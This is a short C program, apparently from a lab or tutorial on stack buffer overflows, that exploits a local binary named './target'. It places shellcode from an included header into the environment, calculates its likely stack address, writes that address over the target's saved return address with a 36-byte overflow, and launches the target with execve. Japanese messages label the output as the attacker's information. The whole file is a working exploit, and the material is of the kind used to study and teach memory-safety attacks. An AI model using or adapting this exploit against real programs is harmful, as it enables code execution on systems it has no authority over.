#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include"shellcode.h"

#define TARGET_RETURN_ADDRESS_OFFSET 36

int main(void){
	unsigned long ret;
	char *buffer, *target_filename = "./target";

	ret = 0x7fffffffeff6 - (sizeof(shellcode) - 1) - strlen(target_filename);
	buffer = malloc(200);
	memset(buffer, 0xcc, 36);
	*((unsigned long*) (buffer + TARGET_RETURN_ADDRESS_OFFSET)) = ret;

	printf("##### 攻撃者の情報 #####\n");
	printf("%s という名前の実効形式に %lubit のシェルコードを環境変数に持たせて実行する場合、シェルコードの先頭アドレスは %lx になると思われます\n\n", target_filename, sizeof(shellcode) - 1, ret);

	char *arg[3] = {target_filename, buffer, NULL};
	char *env[2] = {shellcode, NULL};
	execve(target_filename, arg, env);

	free(buffer);
	return 0;
}
